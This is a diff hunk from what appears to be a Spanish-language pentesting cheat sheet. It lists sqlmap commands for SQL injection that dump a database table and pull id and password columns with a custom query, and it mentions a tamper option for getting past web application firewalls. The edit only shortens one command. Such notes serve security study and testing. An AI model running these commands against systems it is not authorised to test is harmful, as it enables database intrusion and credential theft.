@@ -381,7 +381,7 @@ Anthares101@kali:~$ sqlmap -D DB -T TABLA --columns -r post_request.txt
 Anthares101@kali:~$ sqlmap -D DB -T TABLA --dump --batch -r post_request.txt
 # Hace una copia de toda la información de una determinada tabla de una determinada base de datos
 
-Anthares101@kali:~$ sqlmap -D DB -T TABLA -C id,password,...,... --sql-query "select id,password,...,... from TABLA where COLUMNA like PATRÓN" -r post_request.txt
+Anthares101@kali:~$ sqlmap -D DB --sql-query "select id,password,...,... from TABLA where COLUMNA like PATRÓN" -r post_request.txt
 # Permite extraer los resultados de una query especifica a una tabla conocida
 
 # El parámetro --tamper=space2comment permite intentar saltarse ciertos firewalls (WAF)
